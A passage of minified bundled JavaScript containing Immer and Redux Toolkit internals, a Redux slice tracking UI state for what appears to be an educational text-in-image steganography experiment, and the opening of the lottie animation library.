  a.unfinalizedDrafts_ = a.drafts_.length;
  const o = a.drafts_[0];
  return (
    i !== void 0 && i !== o
      ? (o[DRAFT_STATE].modified_ && (revokeScope(a), die(4)),
        isDraftable(i) &&
          ((i = finalize(a, i)), a.parent_ || maybeFreeze(a, i)),
        a.patches_ &&
          getPlugin("Patches").generateReplacementPatches_(
            o[DRAFT_STATE].base_,
            i,
            a.patches_,
            a.inversePatches_
          ))
      : (i = finalize(a, o, [])),
    revokeScope(a),
    a.patches_ && a.patchListener_(a.patches_, a.inversePatches_),
    i !== NOTHING ? i : void 0
  );
}
function finalize(i, a, o) {
  if (isFrozen(a)) return a;
  const s = a[DRAFT_STATE];
  if (!s) return each(a, (tt, nt) => finalizeProperty(i, s, a, tt, nt, o)), a;
  if (s.scope_ !== i) return a;
  if (!s.modified_) return maybeFreeze(i, s.base_, !0), s.base_;
  if (!s.finalized_) {
    (s.finalized_ = !0), s.scope_.unfinalizedDrafts_--;
    const tt = s.copy_;
    let nt = tt,
      ot = !1;
    s.type_ === 3 && ((nt = new Set(tt)), tt.clear(), (ot = !0)),
      each(nt, (st, ft) => finalizeProperty(i, s, tt, st, ft, o, ot)),
      maybeFreeze(i, tt, !1),
      o &&
        i.patches_ &&
        getPlugin("Patches").generatePatches_(
          s,
          o,
          i.patches_,
          i.inversePatches_
        );
  }
  return s.copy_;
}
function finalizeProperty(i, a, o, s, tt, nt, ot) {
  if (isDraft(tt)) {
    const st =
        nt && a && a.type_ !== 3 && !has(a.assigned_, s)
          ? nt.concat(s)
          : void 0,
      ft = finalize(i, tt, st);
    if ((set(o, s, ft), isDraft(ft))) i.canAutoFreeze_ = !1;
    else return;
  } else ot && o.add(tt);
  if (isDraftable(tt) && !isFrozen(tt)) {
    if (!i.immer_.autoFreeze_ && i.unfinalizedDrafts_ < 1) return;
    finalize(i, tt),
      (!a || !a.scope_.parent_) &&
        typeof s != "symbol" &&
        Object.prototype.propertyIsEnumerable.call(o, s) &&
        maybeFreeze(i, tt);
  }
}
function maybeFreeze(i, a, o = !1) {
  !i.parent_ && i.immer_.autoFreeze_ && i.canAutoFreeze_ && freeze(a, o);
}
function createProxyProxy(i, a) {
  const o = Array.isArray(i),
    s = {
      type_: o ? 1 : 0,
      scope_: a ? a.scope_ : getCurrentScope(),
      modified_: !1,
      finalized_: !1,
      assigned_: {},
      parent_: a,
      base_: i,
      draft_: null,
      copy_: null,
      revoke_: null,
      isManual_: !1,
    };
  let tt = s,
    nt = objectTraps;
  o && ((tt = [s]), (nt = arrayTraps));
  const { revoke: ot, proxy: st } = Proxy.revocable(tt, nt);
  return (s.draft_ = st), (s.revoke_ = ot), st;
}
var objectTraps = {
    get(i, a) {
      if (a === DRAFT_STATE) return i;
      const o = latest(i);
      if (!has(o, a)) return readPropFromProto(i, o, a);
      const s = o[a];
      return i.finalized_ || !isDraftable(s)
        ? s
        : s === peek$1(i.base_, a)
        ? (prepareCopy(i), (i.copy_[a] = createProxy(s, i)))
        : s;
    },
    has(i, a) {
      return a in latest(i);
    },
    ownKeys(i) {
      return Reflect.ownKeys(latest(i));
    },
    set(i, a, o) {
      const s = getDescriptorFromProto(latest(i), a);
      if (s != null && s.set) return s.set.call(i.draft_, o), !0;
      if (!i.modified_) {
        const tt = peek$1(latest(i), a),
          nt = tt == null ? void 0 : tt[DRAFT_STATE];
        if (nt && nt.base_ === o)
          return (i.copy_[a] = o), (i.assigned_[a] = !1), !0;
        if (is(o, tt) && (o !== void 0 || has(i.base_, a))) return !0;
        prepareCopy(i), markChanged(i);
      }
      return (
        (i.copy_[a] === o && (o !== void 0 || a in i.copy_)) ||
          (Number.isNaN(o) && Number.isNaN(i.copy_[a])) ||
          ((i.copy_[a] = o), (i.assigned_[a] = !0)),
        !0
      );
    },
    deleteProperty(i, a) {
      return (
        peek$1(i.base_, a) !== void 0 || a in i.base_
          ? ((i.assigned_[a] = !1), prepareCopy(i), markChanged(i))
          : delete i.assigned_[a],
        i.copy_ && delete i.copy_[a],
        !0
      );
    },
    getOwnPropertyDescriptor(i, a) {
      const o = latest(i),
        s = Reflect.getOwnPropertyDescriptor(o, a);
      return (
        s && {
          writable: !0,
          configurable: i.type_ !== 1 || a !== "length",
          enumerable: s.enumerable,
          value: o[a],
        }
      );
    },
    defineProperty() {
      die(11);
    },
    getPrototypeOf(i) {
      return getPrototypeOf(i.base_);
    },
    setPrototypeOf() {
      die(12);
    },
  },
  arrayTraps = {};
each(objectTraps, (i, a) => {
  arrayTraps[i] = function () {
    return (arguments[0] = arguments[0][0]), a.apply(this, arguments);
  };
});
arrayTraps.deleteProperty = function (i, a) {
  return arrayTraps.set.call(this, i, a, void 0);
};
arrayTraps.set = function (i, a, o) {
  return objectTraps.set.call(this, i[0], a, o, i[0]);
};
function peek$1(i, a) {
  const o = i[DRAFT_STATE];
  return (o ? latest(o) : i)[a];
}
function readPropFromProto(i, a, o) {
  var tt;
  const s = getDescriptorFromProto(a, o);
  return s
    ? "value" in s
      ? s.value
      : (tt = s.get) == null
      ? void 0
      : tt.call(i.draft_)
    : void 0;
}
function getDescriptorFromProto(i, a) {
  if (!(a in i)) return;
  let o = getPrototypeOf(i);
  for (; o; ) {
    const s = Object.getOwnPropertyDescriptor(o, a);
    if (s) return s;
    o = getPrototypeOf(o);
  }
}
function markChanged(i) {
  i.modified_ || ((i.modified_ = !0), i.parent_ && markChanged(i.parent_));
}
function prepareCopy(i) {
  i.copy_ ||
    (i.copy_ = shallowCopy(i.base_, i.scope_.immer_.useStrictShallowCopy_));
}
var Immer2 = class {
  constructor(i) {
    (this.autoFreeze_ = !0),
      (this.useStrictShallowCopy_ = !1),
      (this.produce = (a, o, s) => {
        if (typeof a == "function" && typeof o != "function") {
          const nt = o;
          o = a;
          const ot = this;
          return function (ft = nt, ...ht) {
            return ot.produce(ft, (gt) => o.call(this, gt, ...ht));
          };
        }
        typeof o != "function" && die(6),
          s !== void 0 && typeof s != "function" && die(7);
        let tt;
        if (isDraftable(a)) {
          const nt = enterScope(this),
            ot = createProxy(a, void 0);
          let st = !0;
          try {
            (tt = o(ot)), (st = !1);
          } finally {
            st ? revokeScope(nt) : leaveScope(nt);
          }
          return usePatchesInScope(nt, s), processResult(tt, nt);
        } else if (!a || typeof a != "object") {
          if (
            ((tt = o(a)),
            tt === void 0 && (tt = a),
            tt === NOTHING && (tt = void 0),
            this.autoFreeze_ && freeze(tt, !0),
            s)
          ) {
            const nt = [],
              ot = [];
            getPlugin("Patches").generateReplacementPatches_(a, tt, nt, ot),
              s(nt, ot);
          }
          return tt;
        } else die(1, a);
      }),
      (this.produceWithPatches = (a, o) => {
        if (typeof a == "function")
          return (ot, ...st) =>
            this.produceWithPatches(ot, (ft) => a(ft, ...st));
        let s, tt;
        return [
          this.produce(a, o, (ot, st) => {
            (s = ot), (tt = st);
          }),
          s,
          tt,
        ];
      }),
      typeof (i == null ? void 0 : i.autoFreeze) == "boolean" &&
        this.setAutoFreeze(i.autoFreeze),
      typeof (i == null ? void 0 : i.useStrictShallowCopy) == "boolean" &&
        this.setUseStrictShallowCopy(i.useStrictShallowCopy);
  }
  createDraft(i) {
    isDraftable(i) || die(8), isDraft(i) && (i = current(i));
    const a = enterScope(this),
      o = createProxy(i, void 0);
    return (o[DRAFT_STATE].isManual_ = !0), leaveScope(a), o;
  }
  finishDraft(i, a) {
    const o = i && i[DRAFT_STATE];
    (!o || !o.isManual_) && die(9);
    const { scope_: s } = o;
    return usePatchesInScope(s, a), processResult(void 0, s);
  }
  setAutoFreeze(i) {
    this.autoFreeze_ = i;
  }
  setUseStrictShallowCopy(i) {
    this.useStrictShallowCopy_ = i;
  }
  applyPatches(i, a) {
    let o;
    for (o = a.length - 1; o >= 0; o--) {
      const tt = a[o];
      if (tt.path.length === 0 && tt.op === "replace") {
        i = tt.value;
        break;
      }
    }
    o > -1 && (a = a.slice(o + 1));
    const s = getPlugin("Patches").applyPatches_;
    return isDraft(i) ? s(i, a) : this.produce(i, (tt) => s(tt, a));
  }
};
function createProxy(i, a) {
  const o = isMap(i)
    ? getPlugin("MapSet").proxyMap_(i, a)
    : isSet(i)
    ? getPlugin("MapSet").proxySet_(i, a)
    : createProxyProxy(i, a);
  return (a ? a.scope_ : getCurrentScope()).drafts_.push(o), o;
}
function current(i) {
  return isDraft(i) || die(10, i), currentImpl(i);
}
function currentImpl(i) {
  if (!isDraftable(i) || isFrozen(i)) return i;
  const a = i[DRAFT_STATE];
  let o;
  if (a) {
    if (!a.modified_) return a.base_;
    (a.finalized_ = !0),
      (o = shallowCopy(i, a.scope_.immer_.useStrictShallowCopy_));
  } else o = shallowCopy(i, !0);
  return (
    each(o, (s, tt) => {
      set(o, s, currentImpl(tt));
    }),
    a && (a.finalized_ = !1),
    o
  );
}
var immer = new Immer2(),
  produce = immer.produce;
immer.produceWithPatches.bind(immer);
immer.setAutoFreeze.bind(immer);
immer.setUseStrictShallowCopy.bind(immer);
immer.applyPatches.bind(immer);
immer.createDraft.bind(immer);
immer.finishDraft.bind(immer);
function createThunkMiddleware(i) {
  return ({ dispatch: o, getState: s }) =>
    (tt) =>
    (nt) =>
      typeof nt == "function" ? nt(o, s, i) : tt(nt);
}
var thunk = createThunkMiddleware(),
  withExtraArgument = createThunkMiddleware,
  composeWithDevTools =
    typeof window < "u" && window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__
      ? window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__
      : function () {
          if (arguments.length !== 0)
            return typeof arguments[0] == "object"
              ? compose
              : compose.apply(null, arguments);
        };
function createAction(i, a) {
  function o(...s) {
    if (a) {
      let tt = a(...s);
      if (!tt) throw new Error(formatProdErrorMessage(0));
      return {
        type: i,
        payload: tt.payload,
        ...("meta" in tt && { meta: tt.meta }),
        ...("error" in tt && { error: tt.error }),
      };
    }
    return { type: i, payload: s[0] };
  }
  return (
    (o.toString = () => `${i}`),
    (o.type = i),
    (o.match = (s) => isAction(s) && s.type === i),
    o
  );
}
var Tuple = class $n extends Array {
  constructor(...a) {
    super(...a), Object.setPrototypeOf(this, $n.prototype);
  }
  static get [Symbol.species]() {
    return $n;
  }
  concat(...a) {
    return super.concat.apply(this, a);
  }
  prepend(...a) {
    return a.length === 1 && Array.isArray(a[0])
      ? new $n(...a[0].concat(this))
      : new $n(...a.concat(this));
  }
};
function freezeDraftable(i) {
  return isDraftable(i) ? produce(i, () => {}) : i;
}
function getOrInsertComputed(i, a, o) {
  return i.has(a) ? i.get(a) : i.set(a, o(a)).get(a);
}
function isBoolean(i) {
  return typeof i == "boolean";
}
var buildGetDefaultMiddleware = () =>
    function (a) {
      const {
        thunk: o = !0,
        immutableCheck: s = !0,
        serializableCheck: tt = !0,
        actionCreatorCheck: nt = !0,
      } = a ?? {};
      let ot = new Tuple();
      return (
        o &&
          (isBoolean(o)
            ? ot.push(thunk)
            : ot.push(withExtraArgument(o.extraArgument))),
        ot
      );
    },
  SHOULD_AUTOBATCH = "RTK_autoBatch",
  createQueueWithTimer = (i) => (a) => {
    setTimeout(a, i);
  },
  autoBatchEnhancer =
    (i = { type: "raf" }) =>
    (a) =>
    (...o) => {
      const s = a(...o);
      let tt = !0,
        nt = !1,
        ot = !1;
      const st = new Set(),
        ft =
          i.type === "tick"
            ? queueMicrotask
            : i.type === "raf"
            ? typeof window < "u" && window.requestAnimationFrame
              ? window.requestAnimationFrame
              : createQueueWithTimer(10)
            : i.type === "callback"
            ? i.queueNotification
            : createQueueWithTimer(i.timeout),
        ht = () => {
          (ot = !1), nt && ((nt = !1), st.forEach((gt) => gt()));
        };
      return Object.assign({}, s, {
        subscribe(gt) {
          const St = () => tt && gt(),
            vt = s.subscribe(St);
          return (
            st.add(gt),
            () => {
              vt(), st.delete(gt);
            }
          );
        },
        dispatch(gt) {
          var St;
          try {
            return (
              (tt = !(
                (St = gt == null ? void 0 : gt.meta) != null &&
                St[SHOULD_AUTOBATCH]
              )),
              (nt = !tt),
              nt && (ot || ((ot = !0), ft(ht))),
              s.dispatch(gt)
            );
          } finally {
            tt = !0;
          }
        },
      });
    },
  buildGetDefaultEnhancers = (i) =>
    function (o) {
      const { autoBatch: s = !0 } = o ?? {};
      let tt = new Tuple(i);
      return (
        s && tt.push(autoBatchEnhancer(typeof s == "object" ? s : void 0)), tt
      );
    };
function configureStore(i) {
  const a = buildGetDefaultMiddleware(),
    {
      reducer: o = void 0,
      middleware: s,
      devTools: tt = !0,
      preloadedState: nt = void 0,
      enhancers: ot = void 0,
    } = i;
  let st;
  if (typeof o == "function") st = o;
  else if (isPlainObject$1(o)) st = combineReducers(o);
  else throw new Error(formatProdErrorMessage(1));
  let ft;
  typeof s == "function" ? (ft = s(a)) : (ft = a());
  let ht = compose;
  tt &&
    (ht = composeWithDevTools({ trace: !1, ...(typeof tt == "object" && tt) }));
  const gt = applyMiddleware(...ft),
    St = buildGetDefaultEnhancers(gt);
  let vt = typeof ot == "function" ? ot(St) : St();
  const _t = ht(...vt);
  return createStore(st, nt, _t);
}
function executeReducerBuilderCallback(i) {
  const a = {},
    o = [];
  let s;
  const tt = {
    addCase(nt, ot) {
      const st = typeof nt == "string" ? nt : nt.type;
      if (!st) throw new Error(formatProdErrorMessage(28));
      if (st in a) throw new Error(formatProdErrorMessage(29));
      return (a[st] = ot), tt;
    },
    addMatcher(nt, ot) {
      return o.push({ matcher: nt, reducer: ot }), tt;
    },
    addDefaultCase(nt) {
      return (s = nt), tt;
    },
  };
  return i(tt), [a, o, s];
}
function isStateFunction(i) {
  return typeof i == "function";
}
function createReducer(i, a) {
  let [o, s, tt] = executeReducerBuilderCallback(a),
    nt;
  if (isStateFunction(i)) nt = () => freezeDraftable(i());
  else {
    const st = freezeDraftable(i);
    nt = () => st;
  }
  function ot(st = nt(), ft) {
    let ht = [
      o[ft.type],
      ...s.filter(({ matcher: gt }) => gt(ft)).map(({ reducer: gt }) => gt),
    ];
    return (
      ht.filter((gt) => !!gt).length === 0 && (ht = [tt]),
      ht.reduce((gt, St) => {
        if (St)
          if (isDraft(gt)) {
            const _t = St(gt, ft);
            return _t === void 0 ? gt : _t;
          } else {
            if (isDraftable(gt)) return produce(gt, (vt) => St(vt, ft));
            {
              const vt = St(gt, ft);
              if (vt === void 0) {
                if (gt === null) return gt;
                throw Error(
                  "A case reducer on a non-draftable value must not return undefined"
                );
              }
              return vt;
            }
          }
        return gt;
      }, st)
    );
  }
  return (ot.getInitialState = nt), ot;
}
var asyncThunkSymbol = Symbol.for("rtk-slice-createasyncthunk");
function getType(i, a) {
  return `${i}/${a}`;
}
function buildCreateSlice({ creators: i } = {}) {
  var o;
  const a =
    (o = i == null ? void 0 : i.asyncThunk) == null
      ? void 0
      : o[asyncThunkSymbol];
  return function (tt) {
    const { name: nt, reducerPath: ot = nt } = tt;
    if (!nt) throw new Error(formatProdErrorMessage(11));
    const st =
        (typeof tt.reducers == "function"
          ? tt.reducers(buildReducerCreators())
          : tt.reducers) || {},
      ft = Object.keys(st),
      ht = {
        sliceCaseReducersByName: {},
        sliceCaseReducersByType: {},
        actionCreators: {},
        sliceMatchers: [],
      },
      gt = {
        addCase(yt, wt) {
          const $t = typeof yt == "string" ? yt : yt.type;
          if (!$t) throw new Error(formatProdErrorMessage(12));
          if ($t in ht.sliceCaseReducersByType)
            throw new Error(formatProdErrorMessage(13));
          return (ht.sliceCaseReducersByType[$t] = wt), gt;
        },
        addMatcher(yt, wt) {
          return ht.sliceMatchers.push({ matcher: yt, reducer: wt }), gt;
        },
        exposeAction(yt, wt) {
          return (ht.actionCreators[yt] = wt), gt;
        },
        exposeCaseReducer(yt, wt) {
          return (ht.sliceCaseReducersByName[yt] = wt), gt;
        },
      };
    ft.forEach((yt) => {
      const wt = st[yt],
        $t = {
          reducerName: yt,
          type: getType(nt, yt),
          createNotation: typeof tt.reducers == "function",
        };
      isAsyncThunkSliceReducerDefinition(wt)
        ? handleThunkCaseReducerDefinition($t, wt, gt, a)
        : handleNormalReducerDefinition($t, wt, gt);
    });
    function St() {
      const [yt = {}, wt = [], $t = void 0] =
          typeof tt.extraReducers == "function"
            ? executeReducerBuilderCallback(tt.extraReducers)
            : [tt.extraReducers],
        kt = { ...yt, ...ht.sliceCaseReducersByType };
      return createReducer(tt.initialState, (Rt) => {
        for (let It in kt) Rt.addCase(It, kt[It]);
        for (let It of ht.sliceMatchers) Rt.addMatcher(It.matcher, It.reducer);
        for (let It of wt) Rt.addMatcher(It.matcher, It.reducer);
        $t && Rt.addDefaultCase($t);
      });
    }
    const vt = (yt) => yt,
      _t = new Map();
    let Et;
    function Ct(yt, wt) {
      return Et || (Et = St()), Et(yt, wt);
    }
    function Pt() {
      return Et || (Et = St()), Et.getInitialState();
    }
    function bt(yt, wt = !1) {
      function $t(Rt) {
        let It = Rt[yt];
        return typeof It > "u" && wt && (It = Pt()), It;
      }
      function kt(Rt = vt) {
        const It = getOrInsertComputed(_t, wt, () => new WeakMap());
        return getOrInsertComputed(It, Rt, () => {
          const Ot = {};
          for (const [Nt, zt] of Object.entries(tt.selectors ?? {}))
            Ot[Nt] = wrapSelector(zt, Rt, Pt, wt);
          return Ot;
        });
      }
      return {
        reducerPath: yt,
        getSelectors: kt,
        get selectors() {
          return kt($t);
        },
        selectSlice: $t,
      };
    }
    const xt = {
      name: nt,
      reducer: Ct,
      actions: ht.actionCreators,
      caseReducers: ht.sliceCaseReducersByName,
      getInitialState: Pt,
      ...bt(ot),
      injectInto(yt, { reducerPath: wt, ...$t } = {}) {
        const kt = wt ?? ot;
        return (
          yt.inject({ reducerPath: kt, reducer: Ct }, $t),
          { ...xt, ...bt(kt, !0) }
        );
      },
    };
    return xt;
  };
}
function wrapSelector(i, a, o, s) {
  function tt(nt, ...ot) {
    let st = a(nt);
    return typeof st > "u" && s && (st = o()), i(st, ...ot);
  }
  return (tt.unwrapped = i), tt;
}
var createSlice = buildCreateSlice();
function buildReducerCreators() {
  function i(a, o) {
    return { _reducerDefinitionType: "asyncThunk", payloadCreator: a, ...o };
  }
  return (
    (i.withTypes = () => i),
    {
      reducer(a) {
        return Object.assign(
          {
            [a.name](...o) {
              return a(...o);
            },
          }[a.name],
          { _reducerDefinitionType: "reducer" }
        );
      },
      preparedReducer(a, o) {
        return {
          _reducerDefinitionType: "reducerWithPrepare",
          prepare: a,
          reducer: o,
        };
      },
      asyncThunk: i,
    }
  );
}
function handleNormalReducerDefinition(
  { type: i, reducerName: a, createNotation: o },
  s,
  tt
) {
  let nt, ot;
  if ("reducer" in s) {
    if (o && !isCaseReducerWithPrepareDefinition(s))
      throw new Error(formatProdErrorMessage(17));
    (nt = s.reducer), (ot = s.prepare);
  } else nt = s;
  tt.addCase(i, nt)
    .exposeCaseReducer(a, nt)
    .exposeAction(a, ot ? createAction(i, ot) : createAction(i));
}
function isAsyncThunkSliceReducerDefinition(i) {
  return i._reducerDefinitionType === "asyncThunk";
}
function isCaseReducerWithPrepareDefinition(i) {
  return i._reducerDefinitionType === "reducerWithPrepare";
}
function handleThunkCaseReducerDefinition(
  { type: i, reducerName: a },
  o,
  s,
  tt
) {
  if (!tt) throw new Error(formatProdErrorMessage(18));
  const {
      payloadCreator: nt,
      fulfilled: ot,
      pending: st,
      rejected: ft,
      settled: ht,
      options: gt,
    } = o,
    St = tt(i, nt, gt);
  s.exposeAction(a, St),
    ot && s.addCase(St.fulfilled, ot),
    st && s.addCase(St.pending, st),
    ft && s.addCase(St.rejected, ft),
    ht && s.addMatcher(St.settled, ht),
    s.exposeCaseReducer(a, {
      fulfilled: ot || noop,
      pending: st || noop,
      rejected: ft || noop,
      settled: ht || noop,
    });
}
function noop() {}
function formatProdErrorMessage(i) {
  return `Minified Redux Toolkit error #${i}; visit https://redux-toolkit.js.org/Errors?code=${i} for the full message or use the non-minified dev environment for full errors. `;
}
const initialState = {
    checkedValue: 1,
    openEditText: !1,
    insertText: "",
    convertedBinary: "",
    completedTask: 1,
    selectedImageArr: [],
    instructionIncludes: [0, 1],
    blobArrayImage: [],
    showImage: !1,
    encodingSteps: 0,
    openSimulation: !1,
    openCode: !1,
    dropSteps: [],
    isCompile: !1,
    isImageCompiled: !1,
    isUrlCompiled: !1,
    isEncoder: !1,
    onDecode: !1,
    executiveLine: "",
    steps: ["Select one of the images in which you want to hide text."],
  },
  ExperimentReducer = createSlice({
    name: "expOne",
    initialState,
    reducers: {
      updateCheckedValue: (i, a) => ({
        ...i,
        checkedValue: a.payload,
        encodingSteps: 0,
        ompletedTask: 1,
      }),
      updateEditText: (i, a) => ({ ...i, openEditText: a.payload }),
      updateSelectedImage: (i, a) => ({ ...i, selectedImageId: a.payload }),
      updateEnterText: (i, a) => ({ ...i, insertText: a.payload }),
      updateTextBinary: (i, a) => ({ ...i, convertedBinary: a.payload }),
      updateInstructionIncludes: (i, a) => {
        i.instructionIncludes = [...i.instructionIncludes, a.payload];
      },
      updateCompletedTask: (i, a) => ({ ...i, completedTask: a.payload }),
      updateSelectedImageArr: (i, a) => ({
        ...i,
        selectedImageArr: [...i.selectedImageArr, a.payload],
      }),
      updateBlobImageArr: (i, a) => ({
        ...i,
        blobArrayImage: [...i.blobArrayImage, a.payload],
      }),
      updateShowImage: (i, a) => ({ ...i, showImage: a.payload }),
      updateEncodingSteps: (i, a) => ({ ...i, encodingSteps: a.payload }),
      updateOpenSimulation: (i, a) => ({ ...i, openSimulation: a.payload }),
      updateOpenCode: (i, a) => ({ ...i, openCode: a.payload }),
      updateDropSteps: (i, a) => ({ ...i, dropSteps: a.payload }),
      updateCompiledImage: (i, a) => ({ ...i, isImageCompiled: a.payload }),
      updateCompiledUrl: (i, a) => ({ ...i, isUrlCompiled: a.payload }),
      updateIsCompile: (i, a) => ({ ...i, isCompile: a.payload }),
      updateIsEncoder: (i, a) => ({ ...i, isEncoder: a.payload }),
      updateExecutiveLine: (i, a) => ({ ...i, executiveLine: a.payload }),
      updateOnDecode: (i, a) => ({ ...i, onDecode: a.payload }),
      updateSteps: (i, a) => {
        i.steps.push(a.payload);
      },
      updateClearSteps: (i, a) => {
        i.steps = [];
      },
      updateRsetSimulation: (i, a) => ({
        ...i,
        isCompile: !1,
        isImageCompiled: !1,
        isUrlCompiled: !1,
        isEncoder: !1,
        executiveLine: "",
        onDecode: !1,
      }),
      onClearAll: (i, a) => ({
        checkedValue: 1,
        openEditText: !1,
        insertText: "",
        convertedBinary: "",
        completedTask: 1,
        instructionIncludes: [0, 1],
        encodingSteps: 0,
        openCode: !1,
        executiveLine: "",
        steps: ["Select one of the images you want to hide a text."],
      }),
    },
  }),
  {
    updateCheckedValue,
    updateOnDecode,
    updateDropSteps,
    updateEditText,
    updateSelectedImage,
    updateEnterText,
    updateTextBinary,
    updateCompletedTask,
    updateSelectedImageArr,
    updateBlobImageArr,
    updateShowImage,
    updateEncodingSteps,
    updateOpenSimulation,
    updateOpenCode,
    updateCompiledUrl,
    updateIsCompile,
    updateCompiledImage,
    updateIsEncoder,
    updateExecutiveLine,
    updateRsetSimulation,
    updateSteps,
    updateClearSteps,
    onClearAll,
  } = ExperimentReducer.actions,
  experimentOneReducer = ExperimentReducer.reducer;
var lottie$1 = { exports: {} };
(function (module, exports) {
  typeof navigator < "u" &&
    (function (i, a) {
      module.exports = a();
    })(commonjsGlobal, function () {
      var svgNS = "http://www.w3.org/2000/svg",
        locationHref = "",
        _useWebWorker = !1,
        initialDefaultFrame = -999999,
        setWebWorker = function (a) {
          _useWebWorker = !!a;
        },
        getWebWorker = function () {
          return _useWebWorker;
        },
        setLocationHref = function (a) {
          locationHref = a;
        },
        getLocationHref = function () {
          return locationHref;
        };
      function createTag(i) {
        return document.createElement(i);
      }
      function extendPrototype(i, a) {
        var o,
          s = i.length,
          tt;
        for (o = 0; o < s; o += 1) {
          tt = i[o].prototype;
          for (var nt in tt)
            Object.prototype.hasOwnProperty.call(tt, nt) &&
              (a.prototype[nt] = tt[nt]);
        }
      }
      function getDescriptor(i, a) {
        return Object.getOwnPropertyDescriptor(i, a);
      }
      function createProxyFunction(i) {
        function a() {}
        return (a.prototype = i), a;
      }
      var audioControllerFactory = (function () {
          function i(a) {
            (this.audios = []),
              (this.audioFactory = a),
              (this._volume = 1),
              (this._isMuted = !1);
          }
          return (
            (i.prototype = {
              addAudio: function (o) {
                this.audios.push(o);
              },
              pause: function () {
                var o,
                  s = this.audios.length;
                for (o = 0; o < s; o += 1) this.audios[o].pause();
              },
              resume: function () {
                var o,
                  s = this.audios.length;
                for (o = 0; o < s; o += 1) this.audios[o].resume();
              },
              setRate: function (o) {
                var s,
                  tt = this.audios.length;
                for (s = 0; s < tt; s += 1) this.audios[s].setRate(o);
              },
              createAudio: function (o) {
                return this.audioFactory
                  ? this.audioFactory(o)
                  : window.Howl
                  ? new window.Howl({ src: [o] })
                  : {
                      isPlaying: !1,
                      play: function () {
                        this.isPlaying = !0;
                      },
                      seek: function () {
                        this.isPlaying = !1;
                      },
                      playing: function () {},
                      rate: function () {},
                      setVolume: function () {},
                    };
              },
              setAudioFactory: function (o) {
                this.audioFactory = o;
              },
              setVolume: function (o) {
                (this._volume = o), this._updateVolume();
              },
              mute: function () {
                (this._isMuted = !0), this._updateVolume();
              },
              unmute: function () {
                (this._isMuted = !1), this._updateVolume();
              },
              getVolume: function () {
                return this._volume;
              },
              _updateVolume: function () {
                var o,
                  s = this.audios.length;
                for (o = 0; o < s; o += 1)
                  this.audios[o].volume(this._volume * (this._isMuted ? 0 : 1));
              },
            }),
            function () {
              return new i();
            }
          );
        })(),
        createTypedArray = (function () {
          function i(o, s) {
            var tt = 0,
              nt = [],
              ot;
            switch (o) {
              case "int16":
              case "uint8c":
                ot = 1;
                break;
              default:
                ot = 1.1;
                break;
            }
            for (tt = 0; tt < s; tt += 1) nt.push(ot);
            return nt;
          }
          function a(o, s) {
            return o === "float32"
              ? new Float32Array(s)
              : o === "int16"
              ? new Int16Array(s)
              : o === "uint8c"
              ? new Uint8ClampedArray(s)
              : i(o, s);
          }
          return typeof Uint8ClampedArray == "function" &&
            typeof Float32Array == "function"
            ? a
            : i;
        })();
      function createSizedArray(i) {
        return Array.apply(null, { length: i });
      }
      function _typeof$6(i) {
        "@babel/helpers - typeof";
        return (
          typeof Symbol == "function" && typeof Symbol.iterator == "symbol"
            ? (_typeof$6 = function (o) {
                return typeof o;
              })
            : (_typeof$6 = function (o) {
                return o &&
                  typeof Symbol == "function" &&
                  o.constructor === Symbol &&
                  o !== Symbol.prototype
                  ? "symbol"
                  : typeof o;
              }),
          _typeof$6(i)
        );
      }
      var subframeEnabled = !0,
        expressionsPlugin = null,
        expressionsInterfaces = null,
        idPrefix$1 = "",
        isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent),
        bmPow = Math.pow,
        bmSqrt = Math.sqrt,
        bmFloor = Math.floor,
        bmMax = Math.max,
        bmMin = Math.min,
        BMMath = {};
      (function () {
        var i = [
            "abs",
            "acos",
            "acosh",
            "asin",
            "asinh",
            "atan",
            "atanh",
            "atan2",
            "ceil",
            "cbrt",
            "expm1",
            "clz32",
            "cos",
            "cosh",
            "exp",
            "floor",
            "fround",
            "hypot",
            "imul",
            "log",
            "log1p",
            "log2",
            "log10",
            "max",
            "min",
            "pow",
            "random",
            "round",
            "sign",
            "sin",
            "sinh",
            "sqrt",
            "tan",
            "tanh",
            "trunc",
            "E",
            "LN10",
            "LN2",
            "LOG10E",
            "LOG2E",
            "PI",
            "SQRT1_2",
            "SQRT2",
          ],
          a,
          o = i.length;
        for (a = 0; a < o; a += 1) BMMath[i[a]] = Math[i[a]];
      })(),
        (BMMath.random = Math.random),
        (BMMath.abs = function (i) {
          var a = _typeof$6(i);
          if (a === "object" && i.length) {
            var o = createSizedArray(i.length),
              s,
              tt = i.length;
            for (s = 0; s < tt; s += 1) o[s] = Math.abs(i[s]);
            return o;
          }
          return Math.abs(i);
        });
      var defaultCurveSegments = 150,
        degToRads = Math.PI / 180,
        roundCorner = 0.5519;
      function styleDiv(i) {
        (i.style.position = "absolute"),
          (i.style.top = 0),
          (i.style.left = 0),
          (i.style.display = "block"),
          (i.style.transformOrigin = "0 0"),
          (i.style.webkitTransformOrigin = "0 0"),
          (i.style.backfaceVisibility = "visible"),
          (i.style.webkitBackfaceVisibility = "visible"),
          (i.style.transformStyle = "preserve-3d"),
          (i.style.webkitTransformStyle = "preserve-3d"),
          (i.style.mozTransformStyle = "preserve-3d");
      }
      function BMEnterFrameEvent(i, a, o, s) {
        (this.type = i),
          (this.currentTime = a),
          (this.totalTime = o),
          (this.direction = s < 0 ? -1 : 1);
      }
      function BMCompleteEvent(i, a) {
        (this.type = i), (this.direction = a < 0 ? -1 : 1);
      }
      function BMCompleteLoopEvent(i, a, o, s) {
        (this.type = i),
          (this.currentLoop = o),
          (this.totalLoops = a),
          (this.direction = s < 0 ? -1 : 1);
      }
      function BMSegmentStartEvent(i, a, o) {
        (this.type = i), (this.firstFrame = a), (this.totalFrames = o);
      }
      function BMDestroyEvent(i, a) {
        (this.type = i), (this.target = a);
      }
      function BMRenderFrameErrorEvent(i, a) {
        (this.type = "renderFrameError"),
          (this.nativeError = i),
          (this.currentTime = a);
      }
      function BMConfigErrorEvent(i) {
        (this.type = "configError"), (this.nativeError = i);
      }
      var createElementID = (function () {
        var i = 0;
        return function () {
          return (i += 1), idPrefix$1 + "__lottie_element_" + i;
        };
      })();
      function HSVtoRGB(i, a, o) {
        var s, tt, nt, ot, st, ft, ht, gt;
        switch (
          ((ot = Math.floor(i * 6)),
          (st = i * 6 - ot),
          (ft = o * (1 - a)),
          (ht = o * (1 - st * a)),
          (gt = o * (1 - (1 - st) * a)),
          ot % 6)
        ) {
          case 0:
            (s = o), (tt = gt), (nt = ft);
            break;
          case 1:
